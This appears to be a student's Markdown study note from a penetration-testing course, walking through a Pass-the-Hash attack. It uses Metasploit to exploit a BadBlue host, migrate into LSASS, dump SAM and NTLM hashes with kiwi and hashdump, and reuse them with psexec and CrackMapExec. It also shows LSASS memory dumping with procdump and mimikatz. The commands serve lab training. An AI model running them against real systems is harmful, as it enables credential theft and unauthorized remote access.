# Pass-The-Hash Attack
> Steals the hashed version of someone's password
> -> Uses that hash to log in as that person (Without knowing the actual password)


Why does this work?
In Windows system (especially with SMB, WinRM, or RDP), when you log in:\
- Windows doesn't need the *actual password*, just the **NTLM** hash.
- if I have the **hash** I can use it to log in without decrypting it.
- ⚠️Works only after initial access (post-exploitation)

Example hash
```bash
#The las long string is the NTLM hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
---



Start PostgreSQL and open Metasploit framework console\
[Command breakdown](https://github.com/itr-a/eJTP-Learning/blob/66b4dafe0953fbd05266c1fad910c056686ff57c/Tools/PostgreSQL.md#14)
```bash
service postgresql start && msfconsole
```
Search module
```bash
msf6> search badblue
```
Choose module from **Matching Modules**
```bash
use 1
```
Specify target IP
```bash
set RHOSTS <IP>
```
Exploit
```bash
exploit
```
Find the Process ID of LSASS (Local Security Authority Subsystem Service) process
`pgrep` is Linux command
```bash
meterpreter> pgrep lsass
```
[Command breakdown](https://github.com/itr-a/eJTP-Learning/blob/a3fee5c216c3fb40066529c6048813e24e3b5b9b/Tools/Metasploit.md#81)
```bash
meterpreter> migrate <PID>
```
Show previlege\
[Command](https://github.com/itr-a/eJTP-Learning/blob/a3fee5c216c3fb40066529c6048813e24e3b5b9b/Tools/Metasploit.md#94)
```bash
getuid
```
Load kiwi [kiwi](https://github.com/itr-a/eJTP-Learning/blob/a3fee5c216c3fb40066529c6048813e24e3b5b9b/Tools/Metasploit.md#101)
```bash
load kiwi
```
Get Administrator and TLM credentials
```bash
meterpreter> lsa_dump_sam

#Another way
meterpreter> hashdump
```
Put meterpreter session in the background (Ctr + Z)
Search for the module
(Exploit Windows SMB psexec)
```bash
exploit> search psexec
```
Set username and password
```bash
set SMBUser <username>
set SMBPass
```
Exploit
```bash
exploit
```
CrackMapExec
```bash
# In new Terminal tab
# -H <hash> for hashed password
crackmapexec smb <target-IP> -u <username> -p <password>

#-x for execute a command
~~~~ -x "whoami"
```



#### 📔 Note
- LSASS
  Why we care LSASS?
  -> `lsass.exe` stores sensitive information in memory especially:
  - Logged-in **user credentials**
  - **Password hashes**
  - Authentication tokens\
 
    
  Typical attack flow
  - Exploit the system (gain access)
  - Find `lsass` PID
   ```bash
   pgrep lsass
   ```
  - Dump memory of that PID
   ```bash
   procdump -ma <PID> lsass.dmp
   ```
  - Extract passworkds/hashes with:
  ```bash
  mimikatz lsass.dmp
  ```
